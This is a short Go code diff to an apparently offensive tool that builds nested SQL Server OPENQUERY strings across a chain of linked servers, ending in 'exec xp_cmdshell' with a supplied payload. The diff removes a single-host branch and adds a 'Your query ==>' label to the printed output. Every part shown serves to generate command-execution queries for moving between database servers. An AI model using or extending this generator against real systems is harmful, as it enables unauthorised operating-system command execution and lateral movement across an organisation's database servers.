@@ -14,10 +14,6 @@ func powInt(x, y int) int {
 
 func buildQuery(hosts []string, payload string){
     
-    if len(hosts) == 1 {
-        query := fmt.Sprintf("SELECT * FROM OPENQUERY(\"%s\", 'select @@servername; exec xp_cmdshell ''%s''')",hosts[0],payload)
-        fmt.Print(query)
-    }else {
         quotes := strings.Repeat("'", powInt(2,len(hosts)) )
         payload = "select @@servername; exec xp_cmdshell " + quotes + payload + quotes 
         for i:=len(hosts);i>0;i-- {
@@ -29,8 +25,7 @@ func buildQuery(hosts []string, payload string){
 
 
         }
-        fmt.Print(payload + "\n") 
-    } 
+        fmt.Print("Your query ==> " + payload + "\n") 
 }
 
 
